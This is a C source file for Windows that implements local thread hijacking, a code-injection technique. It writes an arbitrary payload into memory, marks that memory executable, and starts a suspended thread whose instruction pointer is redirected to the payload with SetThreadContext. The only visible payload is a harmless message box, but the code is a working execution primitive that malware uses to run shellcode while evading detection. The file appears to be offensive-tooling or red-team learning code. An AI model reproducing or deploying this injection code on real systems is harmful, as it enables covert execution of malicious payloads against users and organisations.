#include "LocalThreadHIjacking.h"

VOID PayloadStartRoutine(VOID)
{

	MessageBoxW(NULL, L"Hello From Local Thread Hijacking!", L"Thread Hijacking", (MB_OK | MB_ICONEXCLAMATION));
	return;

}

BOOL WritePayload
(
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize,
	_Out_ PVOID* TargetPayloadBuffer,
	_Out_ HANDLE* ThreadHandle
)
{

	BOOL State				= TRUE;
	PVOID PayloadBuffer		= NULL;
	DWORD BytesWritten		= 0;
	DWORD OldProtection		= 0;

	if (!(PayloadBuffer = VirtualAlloc(NULL, PayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)) || PayloadBuffer == NULL)
	{
		WARN("Failed To Allocate %zu Bytes to Payload Buffer!", PayloadSize);
		PRINT_ERROR("VirtualAlloc");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Allocated %zu Bytes to Local Process!", PayloadSize);

	RtlCopyMemory(PayloadBuffer, Payload, PayloadSize);

	INFO("Copied %zu Bytes to Payload Buffer!", PayloadSize);
	INFO("[0x%p] Payload Address", PayloadBuffer);

	if (!VirtualProtect(PayloadBuffer, PayloadSize, PAGE_EXECUTE_READ, &OldProtection))
	{
		WARN("Failed To Change Memory Protections!");
		PRINT_ERROR("VirtualProtect");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Memory Protections Changed! PAGE_READWRITE --> PAGE_EXECUTE_READ");

	if (!(*ThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&PayloadStartRoutine, NULL, CREATE_SUSPENDED, NULL)) || *ThreadHandle == NULL)
	{
		WARN("Failed To Create a Thread Inside Local Process!");
		PRINT_ERROR("CreateThread");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[%ld] Thread Created! Pointing To Our Payload --> [0x%p]", GetThreadId(*ThreadHandle), PayloadBuffer);

	*TargetPayloadBuffer = PayloadBuffer;

_END_FUNC:

	return State;

}

BOOL HijackLocalThread
(
	_In_ HANDLE ThreadHandle,
	_In_ PVOID TargetPayloadBuffer
)
{

	BOOL State				= TRUE;
	CONTEXT ThreadContext	= { 0 };

	RtlSecureZeroMemory(&ThreadContext, sizeof(CONTEXT));
	ThreadContext.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(ThreadHandle, &ThreadContext))
	{
		WARN("Failed To Get Thread Context!");
		PRINT_ERROR("GetThreadContext");
		State = FALSE; goto _END_FUNC;
	}

	ThreadContext.Rip = (DWORD64)TargetPayloadBuffer;

	if (!SetThreadContext(ThreadHandle, &ThreadContext))
	{
		WARN("Failed To Set Thread Context");
		PRINT_ERROR("SetThreadContext");
		State = FALSE; goto _END_FUNC;
	}

	INFO("RIP Instruction Updated, Pointing to Our Payload --> [0x%p]", (PVOID)ThreadContext.Rip);
	INFO("Waiting for Thread to Finish Executing...");

	ResumeThread(ThreadHandle);

	WaitForSingleObject(ThreadHandle, INFINITE);

	OKAY("DONE!");

_END_FUNC:

	if (ThreadHandle)
		CloseHandle(ThreadHandle);

	if (TargetPayloadBuffer)
		VirtualFree(TargetPayloadBuffer, 0, MEM_RELEASE);

	return State;

}